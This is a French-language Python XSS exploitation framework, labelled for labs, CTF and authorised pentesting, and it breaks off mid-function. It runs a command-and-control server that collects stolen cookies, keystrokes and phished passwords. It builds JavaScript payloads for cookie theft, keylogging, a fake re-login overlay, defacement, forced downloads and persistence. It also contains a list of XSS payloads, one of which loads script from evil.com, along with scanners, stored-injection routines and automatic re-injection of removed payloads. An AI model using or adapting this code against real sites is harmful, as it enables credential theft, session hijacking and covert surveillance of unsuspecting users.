#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║  XSS FRAMEWORK ULTIME - PERSISTANCE EDITION v1.0                 ║
║  Framework d'exploitation XSS pour labo/CTF/pentest autorisé     ║
║  Kali Linux (WSL) — Python 3.12                                  ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import uuid
import sqlite3
import hashlib
import threading
import re
import base64
import random
import string
from datetime import datetime, timezone
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote, unquote
from io import StringIO

import requests
import rich
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.text import Text
from rich import box
from flask import Flask, request, jsonify, Response, send_from_directory

# ═════════════════════════════════════════════════════════════════════
# CONFIGURATION GLOBALE
# ═════════════════════════════════════════════════════════════════════

CONSOLE = Console()
DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "xss_framework.db")
C2_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_files")

os.makedirs(C2_DIR, exist_ok=True)

C2_HOST = "0.0.0.0"
C2_PORT = 8080
C2_PUBLIC = "http://127.0.0.1:8080"

TIMEOUT_HTTP = 10
USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"

# ═════════════════════════════════════════════════════════════════════
# BASE DE DONNÉES SQLITE
# ═════════════════════════════════════════════════════════════════════

def db_init():
    """Initialise la base de données SQLite"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type TEXT NOT NULL,
        victim_ip TEXT,
        victim_ua TEXT,
        url TEXT,
        data TEXT,
        raw TEXT,
        timestamp TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS injections (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT NOT NULL,
        param TEXT,
        payload TEXT,
        method TEXT DEFAULT 'GET',
        type TEXT DEFAULT 'reflected',
        status TEXT DEFAULT 'active',
        executions INTEGER DEFAULT 0,
        last_seen TEXT,
        created_at TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS targets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT UNIQUE,
        forms_found INTEGER DEFAULT 0,
        params_found INTEGER DEFAULT 0,
        vulns_found INTEGER DEFAULT 0,
        last_scan TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        action TEXT,
        remote_url TEXT,
        local_path TEXT,
        status TEXT,
        timestamp TEXT
    )""")
    conn.commit()
    conn.close()


def db_insert_capture(cap_type, victim_ip, victim_ua, url, data, raw=""):
    """Insère une capture en base"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO captures (type,victim_ip,victim_ua,url,data,raw,timestamp) VALUES (?,?,?,?,?,?,?)",
              (cap_type, victim_ip, victim_ua, url, json.dumps(data) if isinstance(data, dict) else str(data),
               raw, datetime.now(timezone.utc).isoformat()))
    conn.commit()
    conn.close()


def db_increment_execution(injection_id):
    """Incrémente le compteur d'exécution d'une injection"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE injections SET executions = executions + 1, last_seen = ? WHERE id = ?",
              (datetime.now(timezone.utc).isoformat(), injection_id))
    conn.commit()
    conn.close()


# ═════════════════════════════════════════════════════════════════════
# SERVEUR C2 (FLASK)
# ═════════════════════════════════════════════════════════════════════

app = Flask(__name__)
app.config["SECRET_KEY"] = hashlib.sha256(os.urandom(32)).hexdigest()


@app.route("/collect/cookies", methods=["POST", "GET"])
def collect_cookies():
    """Endpoint de collecte de cookies volés"""
    data = {}
    if request.method == "POST":
        data = request.get_json(silent=True) or dict(request.form)
    else:
        data = dict(request.args)
    cookies_raw = data.get("cookies", "")
    url = data.get("url", "unknown")
    db_insert_capture("cookies", request.remote_addr, request.headers.get("User-Agent", ""),
                      url, {"cookies": cookies_raw})
    CONSOLE.print(f"\n[bold red][COOKIE][/bold red] Capturé de [cyan]{request.remote_addr}[/cyan] — {cookies_raw[:80]}")
    return jsonify({"status": "ok"})


@app.route("/collect/keys", methods=["POST", "GET"])
def collect_keys():
    """Endpoint de collecte de frappes clavier"""
    data = {}
    if request.method == "POST":
        data = request.get_json(silent=True) or dict(request.form)
    else:
        data = dict(request.args)
    keys = data.get("keys", "")
    url = data.get("url", "unknown")
    db_insert_capture("keylogger", request.remote_addr, request.headers.get("User-Agent", ""),
                      url, {"keys": keys})
    CONSOLE.print(f"\n[bold red][KEYLOG][/bold red] De [cyan]{request.remote_addr}[/cyan] — {keys[:60]}")
    return jsonify({"status": "ok"})


@app.route("/collect/phish", methods=["POST", "GET"])
def collect_phish():
    """Endpoint de collecte d'identifiants phishing"""
    data = {}
    if request.method == "POST":
        data = request.get_json(silent=True) or dict(request.form)
    else:
        data = dict(request.args)
    db_insert_capture("phishing", request.remote_addr, request.headers.get("User-Agent", ""),
                      data.get("url", "unknown"), data)
    CONSOLE.print(f"\n[bold red][PHISH][/bold red] De [cyan]{request.remote_addr}[/cyan] — {json.dumps(data)[:80]}")
    return jsonify({"status": "ok"})


@app.route("/collect/beacon", methods=["POST", "GET"])
def collect_beacon():
    """Endpoint beacon — la victime signale sa présence"""
    data = {}
    if request.method == "POST":
        data = request.get_json(silent=True) or dict(request.form)
    else:
        data = dict(request.args)
    db_insert_capture("beacon", request.remote_addr, request.headers.get("User-Agent", ""),
                      data.get("url", "unknown"), data)
    inj_id = data.get("inj_id")
    if inj_id:
        try:
            db_increment_execution(int(inj_id))
        except (ValueError, TypeError):
            pass
    return jsonify({"status": "ok"})


@app.route("/collect/screen", methods=["POST", "GET"])
def collect_screen():
    """Endpoint de collecte d'infos navigateur"""
    data = {}
    if request.method == "POST":
        data = request.get_json(silent=True) or dict(request.form)
    else:
        data = dict(request.args)
    db_insert_capture("beacon_info", request.remote_addr, request.headers.get("User-Agent", ""),
                      data.get("url", "unknown"), data)
    return jsonify({"status": "ok"})


@app.route("/payload/<injection_id>", methods=["GET"])
def serve_payload(injection_id):
    """Sert le payload JS pour une injection donnée"""
    payload_type = request.args.get("t", "beacon")
    js = build_js_payload(payload_type, injection_id)
    return Response(js, mimetype="application/javascript")


@app.route("/download/<filename>", methods=["GET"])
def serve_download(filename):
    """Sert un fichier à télécharger par la victime"""
    safe = os.path.basename(filename)
    path = os.path.join(C2_DIR, safe)
    if os.path.isfile(path):
        return send_from_directory(C2_DIR, safe, as_attachment=True)
    return jsonify({"error": "fichier introuvable"}), 404


def run_c2_server():
    """Lance le serveur Flask en arrière-plan"""
    app.run(host=C2_HOST, port=C2_PORT, debug=False, use_reloader=False, threaded=True)


# ═════════════════════════════════════════════════════════════════════
# GÉNÉRATION DE PAYLOADS JS
# ═════════════════════════════════════════════════════════════════════

def build_js_payload(payload_type, inj_id="0", extra=""):
    """Construit le payload JS selon le type demandé"""
    c2 = C2_PUBLIC

    if payload_type == "beacon":
        return f"""
(function() {{
  var id = '{inj_id}';
  function ping() {{
    fetch('{c2}/collect/beacon', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{inj_id: id, url: location.href, ts: Date.now()}})
    }}).catch(function(){{}});
  }}
  ping();
  setInterval(ping, 30000);
  var nav = {{url: location.href, ref: document.referrer, lang: navigator.language,
             screen: screen.width+'x'+screen.height, plat: navigator.platform}};
  fetch('{c2}/collect/screen', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify(nav)
  }}).catch(function(){{}});
}})();
"""

    elif payload_type == "cookies":
        return f"""
(function() {{
  var id = '{inj_id}';
  var img = new Image();
  img.src = '{c2}/collect/cookies?cookies=' + encodeURIComponent(document.cookie) +
            '&url=' + encodeURIComponent(location.href) + '&inj_id=' + id;
  document.body.appendChild(img);
}})();
"""

    elif payload_type == "keylogger":
        return f"""
(function() {{
  var id = '{inj_id}';
  var buf = '';
  var timer = null;
  document.addEventListener('keypress', function(e) {{
    buf += String.fromCharCode(e.which || e.keyCode);
    if (timer) clearTimeout(timer);
    timer = setTimeout(flush, 3000);
  }});
  document.addEventListener('keydown', function(e) {{
    if (e.key === 'Enter') buf += '\\n';
    if (e.key === 'Backspace') buf = buf.slice(0, -1);
  }});
  function flush() {{
    if (buf.length === 0) return;
    fetch('{c2}/collect/keys', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{keys: buf, url: location.href, inj_id: id}})
    }}).catch(function(){{}});
    buf = '';
  }}
  setInterval(flush, 15000);
}})();
"""

    elif payload_type == "phishing":
        return f"""
(function() {{
  var id = '{inj_id}';
  var overlay = document.createElement('div');
  overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;' +
    'background:rgba(0,0,0,0.9);z-index:999999;display:flex;' +
    'align-items:center;justify-content:center;';
  var form = document.createElement('div');
  form.style.cssText = 'background:#fff;padding:40px;border-radius:8px;' +
    'width:350px;font-family:Arial,sans-serif;';
  form.innerHTML = '<h2 style="text-align:center;color:#333;">Session expirée</h2>' +
    '<p style="text-align:center;color:#666;">Veuillez vous reconnecter</p>' +
    '<input id="xss_user" type="text" placeholder="Email" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;"/>' +
    '<input id="xss_pass" type="password" placeholder="Mot de passe" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;"/>' +
    '<button id="xss_submit" style="width:100%;padding:12px;margin:8px 0;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer;">Se connecter</button>';
  overlay.appendChild(form);
  document.body.appendChild(overlay);
  document.getElementById('xss_submit').addEventListener('click', function() {{
    var u = document.getElementById('xss_user').value;
    var p = document.getElementById('xss_pass').value;
    fetch('{c2}/collect/phish', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{user: u, pass: p, url: location.href, inj_id: id}})
    }}).then(function() {{
      overlay.remove();
    }}).catch(function() {{
      overlay.remove();
    }});
  }});
}})();
"""

    elif payload_type == "deface":
        return f"""
(function() {{
  var id = '{inj_id}';
  var banner = document.createElement('div');
  banner.style.cssText = 'position:fixed;top:0;left:0;width:100%;z-index:999999;' +
    'background:linear-gradient(90deg,#ff0000,#ff6600);color:white;text-align:center;' +
    'padding:20px;font-size:24px;font-weight:bold;font-family:monospace;';
  banner.innerHTML = '⚡ XSS PWNED ⚡ — Sécurité compromise — Framework XSS Ultime';
  document.body.insertBefore(banner, document.body.firstChild);
  fetch('{c2}/collect/beacon', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{inj_id: id, url: location.href, action: 'defaced'}})
  }}).catch(function(){{}});
}})();
"""

    elif payload_type == "redirect":
        target = extra if extra else "https://example.com"
        return f"""
(function() {{
  var id = '{inj_id}';
  fetch('{c2}/collect/beacon', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{inj_id: id, url: location.href, action: 'redirect_to_{target}'}})
  }}).catch(function(){{}});
  setTimeout(function() {{ window.location.href = '{target}'; }}, 1500);
}})();
"""

    elif payload_type == "download_forced":
        fname = extra if extra else "payload.txt"
        return f"""
(function() {{
  var id = '{inj_id}';
  fetch('{c2}/collect/beacon', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{inj_id: id, url: location.href, action: 'forced_download'}})
  }}).catch(function(){{}});
  var a = document.createElement('a');
  a.href = '{c2}/download/{fname}';
  a.download = '{fname}';
  document.body.appendChild(a);
  a.click();
}})();
"""

    elif payload_type == "fetch_file":
        target_url = extra if extra else ""
        return f"""
(function() {{
  var id = '{inj_id}';
  fetch('{target_url}')
    .then(function(r) {{ return r.text(); }})
    .then(function(content) {{
      return fetch('{c2}/collect/screen', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{inj_id: id, url: location.href, action: 'file_fetch',
                              target: '{target_url}', content: content.substring(0, 10000)}})
      }});
    }}).catch(function(){{}});
}})();
"""

    elif payload_type == "persistence":
        return f"""
(function() {{
  var id = '{inj_id}';
  function persist() {{
    // Cookie de persistance
    document.cookie = 'xss_sess_' + id + '=1; path=/; max-age=31536000';
    // localStorage
    try {{ localStorage.setItem('xss_persist_' + id, '1'); }} catch(e) {{}}
    // sessionStorage
    try {{ sessionStorage.setItem('xss_persist_' + id, '1'); }} catch(e) {{}}
    // Service Worker cache
    if ('caches' in window) {{
      caches.open('xss_cache_' + id).then(function(c) {{
        c.put('/xss_keepalive', new Response('1'));
      }}).catch(function(){{}});
    }}
  }}
  persist();
  // Vérifie toutes les 60s que le cookie existe, le recrée si supprimé
  setInterval(function() {{
    if (document.cookie.indexOf('xss_sess_' + id) === -1) {{
      document.cookie = 'xss_sess_' + id + '=1; path=/; max-age=31536000';
      fetch('{c2}/collect/beacon', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{inj_id: id, action: 'repersisted'}})
      }}).catch(function(){{}});
    }}
  }}, 60000);
  // Beacon de vie
  setInterval(function() {{
    fetch('{c2}/collect/beacon', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{inj_id: id, action: 'alive'}})
    }}).catch(function(){{}});
  }}, 30000);
}})();
"""

    elif payload_type == "combined":
        return f"""
(function() {{
  var id = '{inj_id}';
  var c2 = '{c2}';
  function beacon(d) {{
    fetch(c2 + '/collect/beacon', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify(Object.assign({{inj_id: id}}, d))
    }}).catch(function(){{}});
  }}
  // Beacon initial
  beacon({{url: location.href, action: 'loaded'}});
  // Cookies
  beacon({{cookies: document.cookie}});
  // Keylogger
  var buf = '';
  document.addEventListener('keypress', function(e) {{
    buf += String.fromCharCode(e.which || e.keyCode);
  }});
  setInterval(function() {{
    if (buf.length > 0) {{
      fetch(c2 + '/collect/keys', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{keys: buf, url: location.href, inj_id: id}})
      }}).catch(function(){{}});
      buf = '';
    }}
  }}, 10000);
  // Persistance cookie
  document.cookie = 'xss_sess_' + id + '=1; path=/; max-age=31536000';
  setInterval(function() {{
    if (document.cookie.indexOf('xss_sess_' + id) === -1) {{
      document.cookie = 'xss_sess_' + id + '=1; path=/; max-age=31536000';
      beacon({{action: 'repersisted'}});
    }}
  }}, 60000);
  // Beacon périodique
  setInterval(function() {{ beacon({{action: 'alive'}}); }}, 30000);
}})();
"""

    return "// Type de payload inconnu: " + payload_type


# ═════════════════════════════════════════════════════════════════════
# MODULE SCANNER XSS
# ═════════════════════════════════════════════════════════════════════

XSS_PAYLOADS = [
    # Basiques
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
    # Img
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=x onerror=confirm(1)>",
    "<img/src=x/onerror=alert(1)>",
    "<img src=x:alert(1) onerror=eval(src)>",
    "<img src='x' onmouseover='alert(1)'>",
    # SVG
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><discard onbegin=alert(1)>",
    # Iframe
    "<iframe src=javascript:alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<iframe src='javascript:alert(document.cookie)'></iframe>",
    # Body/HTML
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<body background='javascript:alert(1)'>",
    "<div style='background:url(javascript:alert(1))'>",
    "<div onmouseover=alert(1)>hover</div>",
    # Input/Form
    "<input onfocus=alert(1) autofocus>",
    "<input type=text value='x' onfocus=alert(1) autofocus>",
    "<form><button formaction=javascript:alert(1)>click",
    "<isindex type=image src=1 onerror=alert(1)>",
    # Video/Audio
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<video onerror=alert(1)><source>",
    # Marquee/Details
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<details open ontoggle=alert(1)>",
    "<details ontoggle=alert(1) open>xss</details>",
    # Select/Textarea
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen autofocus onfocus=alert(1)>",
    # Encoding / Bypass
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    # Event handlers
    "onerror=alert(1)//",
    "'onmouseover='alert(1)'",
    "\"onfocus=\"alert(1)\" autofocus\"",
    # Template/Expression
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    # Misc
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<a href='javascript:alert(document.cookie)'>click</a>",
    "<base href=javascript:alert(1)//>",
    "<math><mtext><table><mglyph><style><!--</style><img title=--></mglyph><img src=1 onerror=alert(1)>-->",
]

PAYLOAD_SIGNATURES = [
    ("alert(1)", "alert"),
    ("alert('XSS')", "alert"),
    ("confirm(1)", "confirm"),
    ("prompt(1)", "prompt"),
    ("document.cookie", "cookie"),
    ("7*7", "template"),
    ("49", "template_result"),
]


def scan_reflected(url, method="GET", params=None, headers=None, cookies=None):
    """Scanne une URL pour détecter des XSS réfléchis"""
    results = []
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if headers:
        session.headers.update(headers)
    if cookies:
        session.cookies.update(cookies)

    if params is None:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        params = {k: v[0] for k, v in qs.items()}
        url = url.split("?")[0]

    if not params:
        params = {"q": "", "search": "", "id": "", "name": "", "input": "", "page": "",
                  "query": "", "keyword": "", "msg": "", "comment": "", "user": ""}

    # Référence sans payload
    try:
        if method.upper() == "GET":
            ref_resp = session.get(url, params=params, timeout=TIMEOUT_HTTP, allow_redirects=True)
        else:
            ref_resp = session.post(url, data=params, timeout=TIMEOUT_HTTP, allow_redirects=True)
    except requests.RequestException as e:
        CONSOLE.print(f"[red]Erreur connexion : {e}[/red]")
        return results

    for param_name in params:
        for payload in XSS_PAYLOADS[:30]:
            test_params = dict(params)
            marker = f"xssmark{random.randint(1000,9999)}"
            test_payload = payload.replace("alert(1)", f"alert('{marker}')")
            test_payload = payload.replace("alert('XSS')", f"alert('{marker}')")
            test_params[param_name] = test_payload

            try:
                if method.upper() == "GET":
                    resp = session.get(url, params=test_params, timeout=TIMEOUT_HTTP, allow_redirects=True)
                else:
                    resp = session.post(url, data=test_params, timeout=TIMEOUT_HTTP, allow_redirects=True)
            except requests.RequestException:
                continue

            body = resp.text

            # Détection : le payload est-il réfléchi tel quel ?
            if test_payload in body:
                results.append({
                    "param": param_name,
                    "payload": payload,
                    "method": method.upper(),
                    "evidence": "réflexion exacte",
                    "url": url,
                    "status_code": resp.status_code,
                })
            # Détection : le marqueur apparaît dans un contexte script
            elif marker in body:
                # Vérifie si le marqueur est dans un <script> ou attribut event
                if re.search(rf'<script[^>]*>[^<]*{marker}', body, re.IGNORECASE) or \
                   re.search(rf'on\w+\s*=\s*["\']?[^"\']*{marker}', body, re.IGNORECASE):
                    results.append({
                        "param": param_name,
                        "payload": payload,
                        "method": method.upper(),
                        "evidence": "réflexion dans contexte exécutable",
                        "url": url,
                        "status_code": resp.status_code,
                    })

            time.sleep(0.1)  # Rate limiting léger

    return results


def scan_stored(url, method="GET", params=None, headers=None, cookies=None, forms=None):
    """Scanne pour XSS stocké — injecte puis vérifie si le payload persiste"""
    results = []
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if headers:
        session.headers.update(headers)
    if cookies:
        session.cookies.update(cookies)

    marker = f"xssstored{random.randint(10000,99999)}"
    test_payload = f"<script>alert('{marker}')</script>"

    # Injection
    if forms:
        for form_info in forms:
            inject_data = {}
            for field in form_info.get("fields", []):
                if field.get("type") in ("text", "textarea", "hidden", "search", "url", "email"):
                    inject_data[field["name"]] = test_payload
                elif field.get("type") == "submit":
                    inject_data[field["name"]] = field.get("value", "submit")
            if not inject_data:
                continue
            try:
                resp = session.post(form_info["action"], data=inject_data, timeout=TIMEOUT_HTTP, allow_redirects=True)
                # Vérifie la réflexion immédiate
                if marker in resp.text:
                    results.append({
                        "param": str(list(inject_data.keys())),
                        "payload": test_payload,
                        "method": "POST(form)",
                        "evidence": "réflexion après POST formulaire",
                        "url": form_info["action"],
                        "status_code": resp.status_code,
                    })
            except requests.RequestException as e:
                CONSOLE.print(f"[yellow]Erreur formulaire {form_info['action']}: {e}[/yellow]")

    # Vérifie si le payload persiste en rechargeant la page
    try:
        resp = session.get(url, timeout=TIMEOUT_HTTP)
        if marker in resp.text:
            results.append({
                "param": "page",
                "payload": test_payload,
                "method": "GET",
                "evidence": "payload persistant détecté",
                "url": url,
                "status_code": resp.status_code,
            })
    except requests.RequestException:
        pass

    return results


def extract_forms(url, html):
    """Extrait les formulaires d'une page HTML"""
    forms = []
    form_matches = re.finditer(r'<form[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
    for match in form_matches:
        form_html = match.group(0)
        action_match = re.search(r'action=["\']?([^"\'>\s]*)', form_html, re.IGNORECASE)
        method_match = re.search(r'method=["\']?(\w+)', form_html, re.IGNORECASE)
        action = action_match.group(1) if action_match else ""
        if action and not action.startswith("http"):
            action = urljoin(url, action)
        elif not action:
            action = url

        fields = []
        input_matches = re.finditer(r'<input[^>]*>', form_html, re.IGNORECASE)
        for inp in input_matches:
            tag = inp.group(0)
            name_m = re.search(r'name=["\']?([^"\'>\s]+)', tag)
            type_m = re.search(r'type=["\']?([^"\'>\s]+)', tag)
            value_m = re.search(r'value=["\']?([^"\'>]*)', tag)
            if name_m:
                fields.append({
                    "name": name_m.group(1),
                    "type": type_m.group(1) if type_m else "text",
                    "value": value_m.group(1) if value_m else ""
                })

        textarea_matches = re.finditer(r'<textarea[^>]*name=["\']?([^"\'>\s]+)', form_html, re.IGNORECASE)
        for ta in textarea_matches:
            fields.append({"name": ta.group(1), "type": "textarea", "value": ""})

        forms.append({"action": action, "method": (method_match.group(1) if method_match else "post").upper(), "fields": fields})
    return forms


# ═════════════════════════════════════════════════════════════════════
# MODULE EXPLOITATION
# ═════════════════════════════════════════════════════════════════════

def exploit_inject(url, param, method, payload_type, extra="", inj_id=None):
    """
    Injecte un payload d'exploitation dans un paramètre vulnérable.
    Retourne l'ID d'injection pour le tracking.
    """
    if inj_id is None:
        inj_id = str(uuid.uuid4())[:8]

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    js_payload = build_js_payload(payload_type, inj_id, extra)
    # Encode le payload JS en <script src> si possible, sinon inline
    script_tag = f"<script src='{C2_PUBLIC}/payload/{inj_id}?t={payload_type}'></script>"
    inline_payload = f"<script>{js_payload}</script>"

    # On essaie le script externe d'abord (plus fiable pour la persistance)
    for attempt_payload in [script_tag, inline_payload]:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        clean_url = url.split("?")[0]

        if method.upper() == "GET":
            test_params = {k: v[0] for k, v in qs.items()}
            test_params[param] = attempt_payload
            try:
                resp = session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP)
                if attempt_payload in resp.text or "script" in resp.text.lower():
                    break
            except requests.RequestException:
                continue
        else:
            test_data = dict(qs) if qs else {param: ""}
            test_data[param] = attempt_payload
            try:
                resp = session.post(url, data=test_data, timeout=TIMEOUT_HTTP)
                if attempt_payload in resp.text:
                    break
            except requests.RequestException:
                continue

    # Enregistre l'injection en base
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""INSERT INTO injections (url, param, payload, method, type, status, created_at)
                 VALUES (?,?,?,?,?,?,?)""",
              (url, param, payload_type, method.upper(), "exploit", "active",
               datetime.now(timezone.utc).isoformat()))
    injection_id = c.lastrowid
    conn.commit()
    conn.close()

    return injection_id, script_tag


def exploit_stored(url, forms, payload_type, extra="", cookies=None):
    """Injecte un payload XSS stocké via les formulaires d'une page"""
    inj_id = str(uuid.uuid4())[:8]
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if cookies:
        session.cookies.update(cookies)

    script_tag = f"<script src='{C2_PUBLIC}/payload/{inj_id}?t={payload_type}'></script>"
    results = []

    for form_info in forms:
        inject_data = {}
        for field in form_info.get("fields", []):
            if field.get("type") in ("text", "textarea", "hidden", "search", "url", "email"):
                inject_data[field["name"]] = script_tag
            elif field.get("type") == "submit":
                inject_data[field["name"]] = field.get("value", "submit")

        if not inject_data:
            continue

        try:
            resp = session.post(form_info["action"], data=inject_data, timeout=TIMEOUT_HTTP, allow_redirects=True)
            if script_tag in resp.text:
                results.append({"form": form_info["action"], "status": "injected + reflected"})
            else:
                # Vérifie si le payload persiste
                check = session.get(url, timeout=TIMEOUT_HTTP)
                if script_tag in check.text:
                    results.append({"form": form_info["action"], "status": "injected + stored"})
                else:
                    results.append({"form": form_info["action"], "status": "injecté, pas de réflexion visible"})
        except requests.RequestException as e:
            results.append({"form": form_info["action"], "status": f"erreur: {e}"})

    # Enregistre en base
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""INSERT INTO injections (url, param, payload, method, type, status, created_at)
                 VALUES (?,?,?,?,?,?,?)""",
              (url, "forms", payload_type, "POST(form)", "stored_exploit", "active",
               datetime.now(timezone.utc).isoformat()))
    conn.commit()
    conn.close()

    return inj_id, results


# ═════════════════════════════════════════════════════════════════════
# MODULE PERSISTANCE
# ═════════════════════════════════════════════════════════════════════

class PersistenceManager:
    """Gère la persistance des injections XSS"""

    def __init__(self):
        self.running = False
        self.thread = None
        self.interval = 60  # secondes

    def start(self):
        """Démarre la surveillance de persistance"""
        if self.running:
            CONSOLE.print("[yellow]La persistance est déjà active.[/yellow]")
            return
        self.running = True
        self.thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.thread.start()
        CONSOLE.print(f"[green]Persistance activée — vérification toutes les {self.interval}s[/green]")

    def stop(self):
        """Arrête la surveillance"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
        CONSOLE.print("[red]Persistance désactivée.[/red]")

    def _monitor_loop(self):
        """Boucle de vérification et réinjection"""
        while self.running:
            try:
                self._check_and_reinject()
            except Exception as e:
                CONSOLE.print(f"[red]Erreur persistance: {e}[/red]")
            time.sleep(self.interval)

    def _check_and_reinject(self):
        """Vérifie si les injections actives sont toujours présentes, réinjecte sinon"""
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT id, url, param, payload, method FROM injections WHERE status = 'active' AND type = 'exploit'")
        active_injections = c.fetchall()
        conn.close()

        session = requests.Session()
        session.headers.update({"User-Agent": USER_AGENT})

        for inj in active_injections:
            inj_id_db, url, param, payload_type, method = inj
            # Vérifie si la page contient toujours notre marker
            try:
                resp = session.get(url, timeout=TIMEOUT_HTTP)
                body = resp.text
                # Si on ne trouve plus de référence à notre C2, on réinjecte
                if C2_PUBLIC not in body:
                    CONSOLE.print(f"[yellow]Persistance : payload disparu sur {url} — réinjection...[/yellow]")
                    new_inj_id = str(uuid.uuid4())[:8]
                    script_tag = f"<script src='{C2_PUBLIC}/payload/{new_inj_id}?t={payload_type}'></script>"
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query)
                    clean_url = url.split("?")[0]
                    test_params = {k: v[0] for k, v in qs.items()}
                    if param in test_params:
                        test_params[param] = script_tag
                        if method.upper() == "GET":
                            session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP)
                        else:
                            session.post(url, data=test_params, timeout=TIMEOUT_HTTP)
                    CONSOLE.print(f"[green]Réinjection effectuée sur {url}[/green]")
            except requests.RequestException:
                pass

    def list_injections(self):
        """Liste toutes les injections actives"""
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT id, url, param, payload, method, status, executions, last_seen, created_at FROM injections ORDER BY created_at DESC")
        rows = c.fetchall()
        conn.close()
        return rows


persistence_mgr = PersistenceManager()


# ═════════════════════════════════════════════════════════════════════
# MODULE FICHIERS
# ═════════════════════════════════════════════════════════════════════

def file_upload_via_xss(url, param, method, local_file_path, remote_path="/upload"):
    """
    Tente d'uploader un fichier via une XSS (simule un upload forcé côté serveur).
    Dans un contexte réel, l'upload se fait via une requête HTTP classique.
    """
    if not os.path.isfile(local_file_path):
        CONSOLE.print(f"[red]Fichier introuvable : {local_file_path}[/red]")
        return None

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    with open(local_file_path, "rb") as f:
        file_content = f.read()

    filename = os.path.basename(local_file_path)

    try:
        resp = session.post(urljoin(url, remote_path), files={"file": (filename, file_content)}, timeout=TIMEOUT_HTTP)
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO files (action, remote_url, local_path, status, timestamp) VALUES (?,?,?,?,?)",
                  ("upload", urljoin(url, remote_path), local_file_path,
